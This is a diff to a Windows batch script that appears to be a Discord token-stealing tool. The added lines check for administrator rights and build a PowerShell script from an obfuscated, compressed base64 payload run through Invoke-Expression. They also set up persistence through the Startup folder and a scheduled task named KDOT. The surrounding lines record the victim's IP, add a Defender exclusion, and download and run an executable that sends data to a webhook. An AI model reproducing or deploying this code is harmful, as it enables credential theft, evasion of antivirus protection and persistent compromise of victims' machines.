@@ -1,4 +1,25 @@
 @echo off
+NET SESSION >nul 2>&1
+if %errorlevel% == 0 goto naw
+cd %userprofile%\AppData\Local\Temp
+powershell $command = 'Start-Process %~f0'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $Encodedcommand =[Convert]::ToBase64String($Bytes); $Encodedcommand > test.txt
+set /p base64code=<%userprofile%\AppData\Local\Temp\test.txt
+del %userprofile%\AppData\Local\Temp\test.txt
+echo $code = "%base64code%" > %userprofile%\AppData\Local\Temp\penis.ps1
+echo (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) ^| ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) ^| InVoKE-expREssION >> %userprofile%\AppData\Local\Temp\penis.ps1
+powershell.exe -executionpolicy remotesigned -File %userprofile%\AppData\Local\Temp\penis.ps1 && del %userprofile%\AppData\Local\Temp\penis.ps1
+exit
+
+:naw
+@echo off
+mkdir %localappdata%\KDOT
+COPY %~f0 %localappdata%\KDOT\KDOT.bat
+COPY "%~f0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\KDOT.bat"
+SCHTASKS /QUERY /TN "KDOT" >NUL 2>&1
+if %errorlevel% equ 0 goto code
+SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat"
+
+:code
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
@@ -51,7 +72,7 @@ if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\config.json (
 
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
-curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
+curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
 start /w /b main.exe %webhook%
 taskkill /f /im main.exe
 
